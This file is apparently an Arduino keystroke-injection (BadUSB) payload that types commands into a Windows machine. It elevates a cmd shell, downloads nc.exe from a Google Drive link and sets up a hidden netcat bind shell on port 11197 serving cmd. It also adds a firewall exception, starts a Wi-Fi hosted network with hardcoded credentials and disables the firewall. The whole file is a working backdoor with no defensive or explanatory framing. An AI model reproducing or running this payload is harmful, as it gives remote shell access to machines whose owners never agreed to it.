/* Data */
String _SSID = "pancakes";
String _PASS = "bac0n_pancake";
String netcaturl = "https://drive.google.com/uc?export=download`&id=1ZzdBngef2MvXEDXbY9YkmE7CO9CwozRl";

void setup() {
  delay(1000);
  /* Admin CMD Shell */
  GUI_R();
  STRING("powershell Start-Process cmd -Verb RunAs");
  ENTER();
  ALT_S();
  /* NetCat Backdoor */
  STRING("cd %TEMP% && TASKKILL /im nc.exe /f");
  ENTER();
  STRING("powershell rm nc*");
  ENTER();
  STRING("powershell (Invoke-WebRequest -Uri \"" + netcaturl + "\" -OutFile \"nc.exe\")");
  ENTER();
  delay(1000);
  STRING("copy con nc.bat");
  ENTER();
  STRING("nc.exe -e cmd -lp 11197 -vv -L");
  ENTER();
  CTRL_Z();
  ENTER();
  STRING("copy con nc.vbs");
  ENTER();
  STRING("Set WshShell = CreateObject(\"WScript.Shell\")");
  ENTER();
  STRING("WshShell.Run chr(34) & \"%TEMP%\\nc.bat\" & Chr(34), 0");
  ENTER();
  STRING("Set WshShell = Nothing");
  ENTER();
  CTRL_Z();
  ENTER();
  STRING("netsh advfirewall firewall add rule name=\"Netcat\" dir=in action=allow program=\"%TEMP%\\nc.exe\" enable=yes");
  ENTER();
  STRING("start nc.vbs");
  ENTER();
  /* Hosted Network */
  STRING("netsh wlan set hostednetwork mode=allow ssid=" + _SSID + " key=" + _PASS);
  ENTER();
  STRING("netsh wlan start hostednetwork && netsh firewall set opmode disable && exit");
  ENTER();
}
